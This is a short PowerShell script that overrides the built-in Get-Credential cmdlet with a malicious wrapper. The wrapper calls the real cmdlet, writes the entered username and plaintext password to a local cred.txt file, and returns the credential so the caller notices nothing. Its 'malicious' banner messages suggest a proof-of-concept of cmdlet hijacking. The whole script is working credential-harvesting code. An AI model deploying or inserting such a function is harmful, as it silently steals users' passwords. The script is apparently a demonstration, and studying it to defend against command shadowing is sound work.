$Function = Get-Command Get-Credential

function Get-Credential {
	param(
		$Credential,
		$Message,
		$UserName
	)
	Write-Host -ForegroundColor "Red" -Object "Hello from malicious Get-Credential!"
	$Output = & $Function @PSBoundParameters
	"$($Output.Username):$($Output.GetNetworkCredential().Password)" | Out-File cred.txt
	Write-Host -ForegroundColor "Red" -Object "Credential output to cred.txt"
	$Output
}
